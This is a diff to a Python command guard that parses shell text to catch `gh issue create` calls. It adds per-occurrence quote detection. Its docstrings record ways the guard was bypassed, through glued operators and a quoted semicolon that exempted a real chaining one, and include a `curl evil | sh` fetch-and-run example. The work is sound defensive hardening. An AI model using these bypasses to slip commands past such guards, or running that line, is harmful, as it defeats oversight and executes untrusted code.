@@ -321,15 +321,73 @@ def strip_heredocs(text):
     return "\n".join(output)
 
 
-def explode_operators(tokens):
+def quoted_token_mask(text, expected):
+    """Which token POSITIONS were quoted in the source.
+
+    shlex strips quotes, so by the time a token is in hand there is no way to
+    tell `--title "a; b"` from `a` `;` `b`. This asks the source instead.
+
+    A quoted token is DATA and must never be exploded on shell operators. An
+    unquoted one may be `true&&gh`, where the operator is structural and hiding
+    a command. That is the entire distinction.
+
+    It must be answered PER OCCURRENCE, not per token value. Asking "does the
+    text contain a quoted `;`?" classifies every `;` in the command by whether
+    ANY of them was quoted, so
+
+        gh issue create --title x --body ";" ; curl evil | sh
+
+    exempted the real chaining semicolon because a different, quoted one
+    appeared in --body. That is a bypass of this guard, not a nuisance: the
+    exemption added to stop a false refusal became the way through.
+
+    Lexing the same text a second time with `posix=False` preserves the quote
+    characters while producing the same tokens in the same order, so position
+    `i` answers for occurrence `i` and nothing else.
+
+    Args:
+        text: The original command string.
+        expected: Token count from the posix lex, used to prove alignment.
+
+    Returns:
+        A list of booleans, one per token. Empty when the two lexes disagree,
+        which exempts nothing — an unreadable command must not be trusted.
+    """
+    try:
+        raw = shlex.split(text, posix=False)
+    except ValueError:
+        return []
+    # Alignment is the whole basis for indexing one lex by the other's
+    # positions. If the two disagree, fail closed rather than exempt the wrong
+    # token: a missed exemption is a false refusal, a wrong one is a bypass.
+    if len(raw) != expected:
+        return []
+    return [token[:1] in ('"', "'") for token in raw]
+
+
+def explode_operators(tokens, text=""):
     """Split shell control operators glued to adjacent words.
 
     `true&&gh issue create` tokenises as one word `true&&gh`, whose basename is
     not `gh`, so the creation hid behind the operator. Splitting them out means
     an operator can never be load-bearing punctuation inside a token.
 
+    QUOTED tokens are exempt BY POSITION, and that exemption is the fix for a
+    measured false refusal: a `--title "Trim config; org preference"` was split on its
+    semicolon, the `--label status:ready` landed in a different segment from the
+    `gh issue create`, and the guard refused a correctly-formed filing while
+    telling the author to add the label they had already added. Recorded on
+    CodySwannGT/lisa#2634 after it blocked a real filing.
+
+    `shlex.shlex(punctuation_chars=True)` is NOT the fix and was measured: it
+    tokenises the glued case correctly but shatters a GraphQL payload —
+    `query=mutation{issueCreate(input:{})}` becomes three fragments — which is
+    the exact regression the GLUED_OPERATORS comment above records as having
+    silently un-refused every GraphQL creation.
+
     Args:
         tokens: Tokens from shlex.
+        text: The original command string, used to detect quoting.
 
     Returns:
         Tokens with operators separated out.
@@ -338,7 +396,11 @@ def explode_operators(tokens):
         "(" + "|".join(re.escape(op) for op in GLUED_OPERATORS) + ")"
     )
     exploded = []
-    for token in tokens:
+    quoted = quoted_token_mask(text, len(tokens)) if text else []
+    for index, token in enumerate(tokens):
+        if index < len(quoted) and quoted[index]:
+            exploded.append(token)
+            continue
         for piece in pattern.split(token):
             if piece:
                 exploded.append(piece)
@@ -690,9 +752,8 @@ def scan(text, depth):
         A refusal signature, or None when nothing creation-shaped was found.
     """
     try:
-        tokens = explode_operators(
-            shlex.split(strip_heredocs(text), posix=True)
-        )
+        stripped = strip_heredocs(text)
+        tokens = explode_operators(shlex.split(stripped, posix=True), stripped)
     except ValueError:
         # Bash's grammar is not shlex's. `gh issue create --title x #'` is a
         # comment to bash, which strips it and RUNS the create, while shlex
